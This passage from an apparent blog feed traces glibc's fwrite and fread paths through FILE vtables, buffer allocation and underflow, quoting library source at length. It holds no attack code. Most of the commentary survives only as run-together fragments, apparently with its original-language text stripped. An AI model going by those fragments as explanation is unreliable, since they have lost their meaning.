MODE)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;seek__GI__IO_file_seek&#x3D;&#x3D;<mark></mark></mark></p><p>_IO_SYSWRITE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;vtable__write<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong>**_IO_new_file_write**</p><p>do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_write (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_ssize_t n)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">               ? write_not_cancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">               : write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span class="type">char</span> *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write</p><p>_IO_adjust_column_cur_column</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span></span><br><span class="line">_IO_adjust_column (<span class="type">unsigned</span> start, <span class="type">const</span> <span class="type">char</span> *line, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = line + count;</span><br><span class="line">  <span class="keyword">while</span> (ptr &gt; line)</span><br><span class="line">    <span class="keyword">if</span> (*--ptr == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> line + count - ptr - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> start + count;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_adjust_column)</span><br></pre></td></tr></table></figure><p>\n</p><p> <strong>_IO_default_xsputn</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>_IO_default_xsputn&lt;</p><p><strong>fclosefclose</strong></p><h2 id="fwrite-vtable"><a href="#fwrite-vtable" class="headerlink" title="fwrite vtable"></a>fwrite vtable</h2><ul><li><code>_IO_fwrite</code>vtable<code>_IO_new_file_xsputn</code></li><li><code>_IO_new_file_xsputn</code>vtable<code>_IO_new_file_overflow</code></li><li>vtable<code>_IO_new_file_overflow</code>vtable<code>_IO_file_doallocate</code></li><li>vtable<code>_IO_file_doallocate</code>vtable<code>__GI__IO_file_stat</code></li><li><code>new_do_write</code><code>_IO_SYSWRITE</code>vtable<code>_IO_new_file_write</code>write</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fread</title>
      <link href="/2023/03/31/IO-FILE-fread/"/>
      <url>/2023/03/31/IO-FILE-fread/</url>
      
        <content type="html"><![CDATA[<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>ray-cp <a href="https://www.anquanke.com/post/id/177958#h2-5">https://www.anquanke.com/post/id/177958#h2-5</a></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>];</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./text&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">( <span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span> ;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofread.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">weak_alias(_IO_fread , fread);</span><br></pre></td></tr></table></figure><p><strong>_IO_fread</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fread)</span><br></pre></td></tr></table></figure><p>CHECK_FILEfp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IO_DEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((FILE) == NULL) &#123; MAYBE_SET_EINVAL; return RET; &#125; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; COERCE_FILE(FILE); \</span></span><br><span class="line"><span class="meta">           <span class="keyword">if</span> (((FILE)-&gt;_IO_file_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) \</span></span><br><span class="line"><span class="meta">      &#123; MAYBE_SET_EINVAL; return RET; &#125;&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) COERCE_FILE (FILE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>IO_DEBUG</p><p>FILEFILEflag</p><p>_IO_fread_IO_sgetn</p><p><strong>libio&#x2F;genops.c</strong></p><p>_IO_sgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">                       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE)&#123;&#125;).MEMBER)</span></span><br></pre></td></tr></table></figure><p>fucking macro</p><blockquote><p><code>((struct _IO_FILE_plus)&#123;&#125;)</code>  <code>_IO_FILE_plus</code>  <code>vtable</code> </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))-&gt;__xsgetn) (fp, data, n);</span><br></pre></td></tr></table></figure><p><mark><strong>__xsgetn_IO_file_xsgetn</strong><mark></mark></mark></p><hr><p><strong>libio&#x2F;fileops.c</strong></p><p>_IO_file_xsgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn(_IO_FILE* fp, <span class="type">void</span>* data, _IO_size_t n) &#123;</span><br><span class="line">  _IO_size_t want, have;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span>* s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf(fp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    <span class="keyword">if</span> (want &lt;= have) &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">      fp-&gt;_IO_read_ptr += want;</span><br><span class="line">      want = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (have &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">        s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">        s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        want -= have;</span><br><span class="line">        fp-&gt;_IO_read_ptr += have;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_in_backup(fp)) &#123;</span><br><span class="line">        _IO_switch_to_main_get_area(fp);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">         the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">         the user buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="type">size_t</span>)(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">         waiting for input. */</span></span><br><span class="line">      _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">      count = want;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base) &#123;</span><br><span class="line">        _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">        <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">          count -= want % block_size;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      count = _IO_SYSREAD(fp, s, count);</span><br><span class="line">      <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">          fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      s += count;</span><br><span class="line">      want -= count;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>_IO_IN_BACKUP<br>IOIOIO_IO_IN_BACKUPIO</p><p>_IO_doallocbuf(buf)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>_IO_DOALLOCATE</p><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _IO_DOALLOCATE(FP)  JUMP0(__doallocate , FP)</span></span><br></pre></td></tr></table></figure><p><mark>**__doallocate<strong></strong>_IO_file_doallocate**<mark></mark></mark></p><p><strong>libio&#x2F;filedoalloc.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate(_IO_FILE* fp) &#123;</span><br><span class="line">  _IO_size_t size;</span><br><span class="line">  <span class="type">char</span>* p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LIBC</span></span><br><span class="line">  <span class="comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span></span><br><span class="line"><span class="comment">     function it points to.  This is to make sure _IO_cleanup gets called</span></span><br><span class="line"><span class="comment">     on exit.  We call it from _IO_file_doallocate, since that is likely</span></span><br><span class="line"><span class="comment">     to get called by any program that does buffered I/O. */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(_IO_cleanup_registration_needed != <span class="literal">NULL</span>))</span><br><span class="line">    (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  size = _IO_BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect(_IO_SYSSTAT(fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (S_ISCHR(st.st_mode)) &#123;</span><br><span class="line">      <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">        DEV_TTY_P(&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        local_isatty(fp-&gt;_fileno))</span><br><span class="line">        fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span>)</span><br><span class="line">      size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb(fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>struct stat64UNIXLinux&lt;sys&#x2F;stat.h&gt;</p><ol><li>dev</li><li>inoi</li><li>mode</li><li>nlink</li><li>uidID</li><li>gidID</li><li>rdev</li><li>size</li><li>blksize</li><li>blocks</li><li>atime</li><li>mtime</li><li>ctime</li></ol><p><mark><strong>_IO_SYSSTAT__stat_IO_file_stat</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSTAT(FP, BUF) JUMP1 (__stat, FP, BUF)</span></span><br></pre></td></tr></table></figure><p>SYS_fstat<strong>st.blksize</strong></p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331170443379.png" alt="image-20230331170443379"></p><p><strong>libio&#x2F;genops.c</strong>**_IO_setb**</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb(_IO_FILE* f, <span class="type">char</span>* b, <span class="type">char</span>* eb, <span class="type">int</span> a) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span>(f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_setb)</span><br></pre></td></tr></table></figure><p>f_IO_buf_base_IO_USER_BUF</p><p>_IO_buf_basemalloc_IO_buf_end+_flags</p><blockquote><p>#define _IO_USER_BUF 1 &#x2F;* User owns buffer; dont delete it on close. *&#x2F;</p><p>_IO_USER_BUF I&#x2F;O  <code>_IO_USER_BUF</code>  I&#x2F;O  I&#x2F;O  <code>_IO_USER_BUF</code>  I&#x2F;O  </p></blockquote><hr><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>_IO_file_xsgetnfreadcount</p><p><code> if (fp-&gt;_IO_buf_base&amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</code></p><h4 id="want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base--fread4k"><a href="#want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base--fread4k" class="headerlink" title="want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base),fread4k"></a><strong>want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base),fread4k</strong></h4><p><strong>libio&#x2F;genops.c</strong> __underflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure><p><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code></p><p>_IO_UNDERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)</span></span><br></pre></td></tr></table></figure><p><mark><strong>__underflow_IO_new_file_underflow</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<span class="comment">//_IO_NO_READS</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_doallocbuf (fp);<span class="comment">//_IO_doallocbuf</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"><span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">     unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span 